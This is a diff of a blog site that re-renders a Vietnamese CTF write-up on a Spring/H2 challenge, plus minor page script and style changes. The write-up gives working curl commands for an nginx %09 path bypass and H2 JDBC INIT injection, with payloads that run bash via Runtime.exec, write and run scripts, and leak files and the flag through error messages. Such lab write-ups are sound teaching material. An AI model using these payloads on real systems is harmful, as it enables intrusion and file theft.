@@ -27,16 +27,8 @@ Mọi truy cập từ ngoài đi qua nginx rồi mới tới app.
 
 
 1.2 Nginx chặn exact-match
-
-
-1
-2
-
-
 location = /internal/testConnection { return 403; }
 location / { proxy_pass http://app:8989; }
-
-
 
 Dùng exact match (=) → chỉ chặn đúng chuỗi /internal/testConnection.
 Nếu path có ký tự rác ở cuối (vd: tab %09) thì không match và bị proxy vào backend.
@@ -46,63 +38,29 @@ Tomcat normalize URL → trả về đường dẫn gốc /internal/testConnecti
 
 Controller/route: /login, /register, /dashboard, /dashboard/save, /internal/testConnection.
 application.properties:
-
-
-1
-2
-3
-
-
 spring.datasource.url=jdbc:h2:mem:ctfdb;DB_CLOSE_DELAY=-1
 spring.datasource.driver-class-name=org.h2.Driver
 server.port=8989
 
-
-
 InternalController (rút từ bytecode/strings &#43; template):
 
 Endpoint /internal/testConnection có lỗ hổng JDBC Injection vì ghép trực tiếp username/password vào chuỗi kết nối:
-
-
-1
-2
-
-
 String fullUrl = baseUrl &#43; &#34;USER=&#34; &#43; username &#43; &#34;;PASSWORD=&#34; &#43; password &#43; &#34;;&#34;;
 Connection conn = DriverManager.getConnection(fullUrl);
 
 
 
-
-
 Và xử lý lỗi lộ thông tin:
-
-
-1
-2
-3
-
-
 catch (Exception e) {
 model.addAttribute(&#34;error&#34;, &#34;Connection failed: &#34; &#43; e.getMessage() &#43; &#34; | URL: &#34; &#43; fullUrl);
 }
 
 
-
-
 1.4 Dockerfile (giấu flag)
 
 flag.txt được đổi tên ngẫu nhiên:
-
-
-1
-2
-
-
 RAND_NAME=$(tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 16)
 mv /flag.txt &#34;/${RAND_NAME}&#34; &amp;&amp; rm -f /flag.txt
-
-
 
 Nên phải liệt kê / để biết tên file flag thực tế.
 
@@ -200,17 +158,9 @@ location = chỉ chặn chuỗi y hệt.">
 <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1ZEET_0xg.png">
 <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1oMNauCgl.png"></p>
 <h3 id="12-nginx-chặn-exact-match">1.2 Nginx chặn exact-match<a hidden class="anchor" aria-hidden="true" href="#12-nginx-chặn-exact-match">#</a></h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">location</span> <span class="p">=</span> <span class="s">/internal/testConnection</span> <span class="p">{</span> <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span> <span class="p">}</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="k">location</span> <span class="p">=</span> <span class="s">/internal/testConnection</span> <span class="p">{</span> <span class="kn">return</span> <span class="mi">403</span><span class="p">;</span> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="k">location</span> <span class="s">/</span> <span class="p">{</span> <span class="kn">proxy_pass</span> <span class="s">http://app:8989</span><span class="p">;</span> <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
+</span></span></code></pre></div><ul>
 <li>Dùng <strong>exact match</strong> (<code>=</code>) → chỉ chặn đúng chuỗi <code>/internal/testConnection</code>.</li>
 <li>Nếu path có <strong>ký tự rác</strong> ở cuối (vd: tab <code>%09</code>) thì <strong>không match</strong> và bị proxy vào backend.</li>
 <li><strong>Tomcat normalize</strong> URL → trả về đường dẫn gốc <code>/internal/testConnection</code> trước khi vào Spring.</li>
@@ -219,64 +169,30 @@ location = chỉ chặn chuỗi y hệt.">
 <ul>
 <li>Controller/route: <code>/login</code>, <code>/register</code>, <code>/dashboard</code>, <code>/dashboard/save</code>, <strong><code>/internal/testConnection</code></strong>.</li>
 <li><code>application.properties</code>:
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">spring.datasource.url=jdbc:h2:mem:ctfdb;DB_CLOSE_DELAY=-1
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">spring.datasource.url=jdbc:h2:mem:ctfdb;DB_CLOSE_DELAY=-1
 </span></span><span class="line"><span class="cl">spring.datasource.driver-class-name=org.h2.Driver
 </span></span><span class="line"><span class="cl">server.port=8989
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 <li><strong>InternalController</strong> (rút từ bytecode/strings + template):
 <ul>
 <li>Endpoint /internal/testConnection có lỗ hổng JDBC Injection vì ghép trực tiếp username/password vào chuỗi kết nối:
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String fullUrl = baseUrl + &#34;USER=&#34; + username + &#34;;PASSWORD=&#34; + password + &#34;;&#34;;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String fullUrl = baseUrl + &#34;USER=&#34; + username + &#34;;PASSWORD=&#34; + password + &#34;;&#34;;
 </span></span><span class="line"><span class="cl">Connection conn = DriverManager.getConnection(fullUrl);
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 <li>Và xử lý lỗi lộ thông tin:
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">catch (Exception e) {
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">catch (Exception e) {
 </span></span><span class="line"><span class="cl">model.addAttribute(&#34;error&#34;, &#34;Connection failed: &#34; + e.getMessage() + &#34; | URL: &#34; + fullUrl);
 </span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <h3 id="14-dockerfile-giấu-flag">1.4 Dockerfile (giấu flag)<a hidden class="anchor" aria-hidden="true" href="#14-dockerfile-giấu-flag">#</a></h3>
 <ul>
 <li><code>flag.txt</code> được <strong>đổi tên ngẫu nhiên</strong>:
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">RAND_NAME</span><span class="o">=</span><span class="k">$(</span>tr -dc A-Za-z0-9 &lt;/dev/urandom <span class="p">|</span> head -c 16<span class="k">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">RAND_NAME</span><span class="o">=</span><span class="k">$(</span>tr -dc A-Za-z0-9 &lt;/dev/urandom <span class="p">|</span> head -c 16<span class="k">)</span>
 </span></span><span class="line"><span class="cl">mv /flag.txt <span class="s2">&#34;/</span><span class="si">${</span><span class="nv">RAND_NAME</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">&amp;&amp;</span> rm -f /flag.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 <li>Nên <strong>phải liệt kê <code>/</code></strong> để biết tên file flag thực tế.</li>
 </ul>
 <h2 id="2-phân-tích-lỗ-hổng">2) Phân tích lỗ hổng<a hidden class="anchor" aria-hidden="true" href="#2-phân-tích-lỗ-hổng">#</a></h2>
@@ -333,63 +249,17 @@ location = chỉ chặn chuỗi y hệt.">
 <blockquote>
 <p>Host: <code>http://localhost:8989/</code>, đã có <code>JSESSIONID=&lt;SESSION&gt;</code>.</p></blockquote>
 <h3 id="41-bypass-nhanh">4.1 Bypass nhanh<a hidden class="anchor" aria-hidden="true" href="#41-bypass-nhanh">#</a></h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="42-tạo-bảng-tạm--seed">4.2 Tạo bảng tạm &amp; seed<a hidden class="anchor" aria-hidden="true" href="#42-tạo-bảng-tạm--seed">#</a></h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s1">&#39;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=CREATE TABLE X(d VARCHAR)&#39;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>
+</span></span></code></pre></div><h3 id="42-tạo-bảng-tạm--seed">4.2 Tạo bảng tạm &amp; seed<a hidden class="anchor" aria-hidden="true" href="#42-tạo-bảng-tạm--seed">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s1">&#39;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=CREATE TABLE X(d VARCHAR)&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s1">&#39;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=INSERT INTO X VALUES(&#39;</span><span class="s2">&#34;&#39;&#34;</span><span class="s1">&#39;CREATE &#39;</span><span class="s2">&#34;&#39;&#34;</span><span class="s1">&#39;)&#39;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="43-ghép-payload-1-liệt-kê-">4.3 Ghép payload 1 (liệt kê <code>/</code>)<a hidden class="anchor" aria-hidden="true" href="#43-ghép-payload-1-liệt-kê-">#</a></h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ALIAS</span><span class="w"> </span><span class="n">SHELL</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">$$void</span><span class="w"> </span><span class="nf">shell</span><span class="p">()</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></code></pre></div><h3 id="43-ghép-payload-1-liệt-kê-">4.3 Ghép payload 1 (liệt kê <code>/</code>)<a hidden class="anchor" aria-hidden="true" href="#43-ghép-payload-1-liệt-kê-">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ALIAS</span><span class="w"> </span><span class="n">SHELL</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">$$void</span><span class="w"> </span><span class="nf">shell</span><span class="p">()</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="s">&#34;ls / &gt; /tmp/ls&#34;</span><span class="p">});</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="n">$$</span><span class="p">;</span><span class="n">CALL</span><span class="w"> </span><span class="nf">SHELL</span><span class="p">();</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>Sinh ASCII và append:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 - <span class="s">&lt;&lt;&#39;PY&#39;
+</span></span></span></code></pre></div><p>Sinh ASCII và append:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 - <span class="s">&lt;&lt;&#39;PY&#39;
 </span></span></span><span class="line"><span class="cl"><span class="s">p=&#39;&#39;&#39;ALIAS SHELL AS $$void shell()throws Exception{
 </span></span></span><span class="line"><span class="cl"><span class="s">Runtime.getRuntime().exec(new String[]{&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;ls / &gt; /tmp/ls&#34;});
 </span></span></span><span class="line"><span class="cl"><span class="s">}$$;CALL SHELL();&#39;&#39;&#39;
@@ -406,76 +276,28 @@ location = chỉ chặn chuỗi y hệt.">
 </span></span></span><span class="line"><span class="cl"><span class="s">for ch in p: print(ord(ch))
 </span></span></span><span class="line"><span class="cl"><span class="s">PY</span>
 </span></span><span class="line"><span class="cl"><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="44-ghi--chạy-script">4.4 Ghi &amp; chạy script<a hidden class="anchor" aria-hidden="true" href="#44-ghi--chạy-script">#</a></h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s2">&#34;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=CALL FILE_WRITE((SELECT d FROM X LIMIT 1), &#39;/tmp/rce&#39;)&#34;</span>
+</span></span></code></pre></div><h3 id="44-ghi--chạy-script">4.4 Ghi &amp; chạy script<a hidden class="anchor" aria-hidden="true" href="#44-ghi--chạy-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s2">&#34;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=CALL FILE_WRITE((SELECT d FROM X LIMIT 1), &#39;/tmp/rce&#39;)&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s2">&#34;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM &#39;/tmp/rce&#39;&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="45-leak-danh-sách--error-based">4.5 Leak danh sách <code>/</code> (error-based)<a hidden class="anchor" aria-hidden="true" href="#45-leak-danh-sách--error-based">#</a></h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">resp</span><span class="o">=</span><span class="k">$(</span>curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s2">&#34;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM &#39;/tmp/ls&#39;&#34;</span><span class="k">)</span>
+</span></span></code></pre></div><h3 id="45-leak-danh-sách--error-based">4.5 Leak danh sách <code>/</code> (error-based)<a hidden class="anchor" aria-hidden="true" href="#45-leak-danh-sách--error-based">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">resp</span><span class="o">=</span><span class="k">$(</span>curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s2">&#34;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM &#39;/tmp/ls&#39;&#34;</span><span class="k">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$resp</span><span class="s2">&#34;</span> <span class="p">|</span> sed -n <span class="s1">&#39;s/.*Connection failed: \(.*\) | URL:.*//p&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># → tìm tên flag 16 ký tự chữ+số, ví dụ: Qb7f4s2Kc8Y1Z0Pd</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="46-payload-2-đọc-flag--exfil">4.6 Payload 2 (đọc flag) &amp; exfil<a hidden class="anchor" aria-hidden="true" href="#46-payload-2-đọc-flag--exfil">#</a></h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ALIAS</span><span class="w"> </span><span class="n">SHELL</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">$$void</span><span class="w"> </span><span class="nf">shell</span><span class="p">()</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></code></pre></div><h3 id="46-payload-2-đọc-flag--exfil">4.6 Payload 2 (đọc flag) &amp; exfil<a hidden class="anchor" aria-hidden="true" href="#46-payload-2-đọc-flag--exfil">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ALIAS</span><span class="w"> </span><span class="n">SHELL</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">$$void</span><span class="w"> </span><span class="nf">shell</span><span class="p">()</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="s">&#34;cat /Qb7f4s2Kc8Y1Z0Pd &gt; /tmp/flag&#34;</span><span class="p">});</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="n">$$</span><span class="p">;</span><span class="n">CALL</span><span class="w"> </span><span class="nf">SHELL</span><span class="p">();</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>Lặp lại bước ghép/ghi/chạy như trên (có thể dùng bảng <code>Y(d)</code>), rồi:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s2">&#34;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM &#39;/tmp/flag&#39;&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Response thành công sẽ trả về</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w"> </span><span class="n">200</span><span class="w"> </span><span class="n">OK</span><span class="w">
+</span></span></span></code></pre></div><p>Lặp lại bước ghép/ghi/chạy như trên (có thể dùng bảng <code>Y(d)</code>), rồi:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;http://localhost:8989/internal/testConnection%09&#34;</span>   -H <span class="s2">&#34;Cookie: JSESSIONID=&lt;SESSION&gt;&#34;</span>   -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>   --data-raw <span class="s2">&#34;username=a&amp;password=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM &#39;/tmp/flag&#39;&#34;</span>
+</span></span></code></pre></div><p>Response thành công sẽ trả về</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w"> </span><span class="n">200</span><span class="w"> </span><span class="n">OK</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">div</span><span class="w"> </span><span class="n">th</span><span class="p">:</span><span class="k">if</span><span class="o">=</span><span class="s">&#34;${error}&#34;</span><span class="w"> </span><span class="kd">class</span><span class="err">=&#34;</span><span class="nc">alert</span><span class="w"> </span><span class="n">alert</span><span class="o">-</span><span class="n">danger</span><span class="s">&#34;&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s">    Connection failed: Syntax error in SQL statement &#34;</span><span class="n">CSCV2025</span><span class="p">{</span><span class="n">Fake_flag</span><span class="p">}</span><span class="s">&#34;; expected... | URL: jdbc:h2:mem:testdb;MODE=MySQL;INIT=CREATE SCHEMA IF NOT EXISTS testdb;USER=a;PASSWORD=a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM &#39;/tmp/shaaa&#39;;
 </span></span></span><span class="line"><span class="cl"><span class="s">&lt;/div&gt;
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="references-và-tài-liệu-tham-khảo">References Và Tài Liệu Tham Khảo<a hidden class="anchor" aria-hidden="true" href="#references-và-tài-liệu-tham-khảo">#</a></h2>
+</span></span></span></code></pre></div><h2 id="references-và-tài-liệu-tham-khảo">References Và Tài Liệu Tham Khảo<a hidden class="anchor" aria-hidden="true" href="#references-và-tài-liệu-tham-khảo">#</a></h2>
 <p>H2 Docs: <a href="https://h2database.com/html/features.html#init">https://h2database.com/html/features.html#init</a> (INIT param).
 Tomcat URL Normalization: <a href="https://tomcat.apache.org/tomcat-9.0-doc/config/http.html">https://tomcat.apache.org/tomcat-9.0-doc/config/http.html</a>.
 CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
@@ -506,6 +328,7 @@ CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
 </a><div id="three-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -9999; background: #000;"></div>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
+    
     let scene, camera, renderer, networkGroup;
     let mouseX = 0, mouseY = 0;
     const container = document.getElementById('three-container');
@@ -581,7 +404,7 @@ CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
 
 
 <div id="cyber-back-btn" style="display: none;" onclick="goBack()">
-    <span class="cmd">&lt;</span> <span class="text">RETURN</span>
+    <span class="cmd">&lt; cd ..</span> <span class="text">/ RETURN</span>
 </div>
 
 <div id="hackmd-toc-wrapper" style="display: none;">
@@ -590,34 +413,26 @@ CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
 </div>
 
 <script>
-    
     function goBack() {
-        
         if (window.history.length > 1 && document.referrer.indexOf(window.location.host) !== -1) {
             window.history.back();
-        } else {
-            window.location.href = '/'; 
-        }
+        } else { window.location.href = '/'; }
     }
 
-    
     function generateHackMDTOC() {
         const tocWrapper = document.getElementById('hackmd-toc-wrapper');
         const tocContent = document.getElementById('hackmd-toc-content');
         const backBtn = document.getElementById('cyber-back-btn');
         const postContent = document.querySelector('.post-content');
 
-        
         if(tocContent) tocContent.innerHTML = '';
         if(tocWrapper) tocWrapper.style.display = 'none';
         if(backBtn) backBtn.style.display = 'none';
 
-        
         if (postContent && tocContent) {
             
-            if(backBtn) backBtn.style.display = 'block';
+            backBtn.style.display = 'block';
 
-            
             const headings = postContent.querySelectorAll('h1, h2, h3, h4');
             if (headings.length > 0) {
                 tocWrapper.style.display = 'block';
@@ -676,79 +491,151 @@ CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
 
 <style>
      
-    #cyber-back-btn {
-        position: fixed;
-        left: 20px;
-        top: 130px;  
-        width: 260px;  
-        padding: 10px 15px;
-        box-sizing: border-box;
-        
-        background: rgba(0, 0, 0, 0.8);
-        border: 1px solid #00ff41;
-        border-left: 5px solid #00ff41;  
-        color: #00ff41;
-        
-        font-family: 'Courier New', monospace;
-        font-weight: bold;
-        font-size: 14px;
-        cursor: pointer;
-        z-index: 95;
-        transition: all 0.3s ease;
-        backdrop-filter: blur(5px);
-        
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
-
-    #cyber-back-btn:hover {
-        background: rgba(0, 255, 65, 0.2);
-        box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
-        padding-left: 25px;  
-    }
-    
-    #cyber-back-btn .cmd { opacity: 0.7; margin-right: 5px; }
-
-     
-    #hackmd-toc-wrapper {
-        position: fixed;
-        left: 20px;
-        top: 180px;  
-        width: 260px;
-        max-height: calc(100vh - 200px);
-        overflow-y: auto;
-        z-index: 90;
-        background: transparent;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
